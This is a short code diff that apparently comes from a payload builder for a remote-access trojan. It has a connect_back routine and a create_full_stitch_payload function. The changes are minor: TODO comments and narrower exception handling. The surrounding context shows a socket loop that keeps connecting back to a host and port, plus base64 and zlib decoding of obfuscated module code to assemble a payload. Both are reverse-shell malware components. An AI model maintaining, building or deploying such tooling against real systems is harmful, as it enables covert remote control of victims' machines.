@@ -28,6 +28,7 @@ def connect_back():
     
     print(f"[*] Connecting to {{HOST}}:{{PORT}}...")
     
+    # TODO: Ensure loop has proper exit condition
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -106,7 +107,7 @@ def create_full_stitch_payload():
                         # Decode it
                         decoded = zlib.decompress(base64.b64decode(encoded))
                         modules_code['main'] = decoded.decode()
-                except:
+                except Exception:
                     modules_code['main'] = content.decode()
             else:
                 # Other modules might be encoded too
@@ -119,7 +120,7 @@ def create_full_stitch_payload():
                         modules_code[filename.replace('.py', '')] = decoded.decode()
                     else:
                         modules_code[filename.replace('.py', '')] = content.decode()
-                except:
+                except Exception:
                     modules_code[filename.replace('.py', '')] = content.decode()
     
     # Create a working payload
@@ -169,6 +170,7 @@ try:
     HOST = '127.0.0.1'
     PORT = 4040
     
+    # TODO: Ensure loop has proper exit condition
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
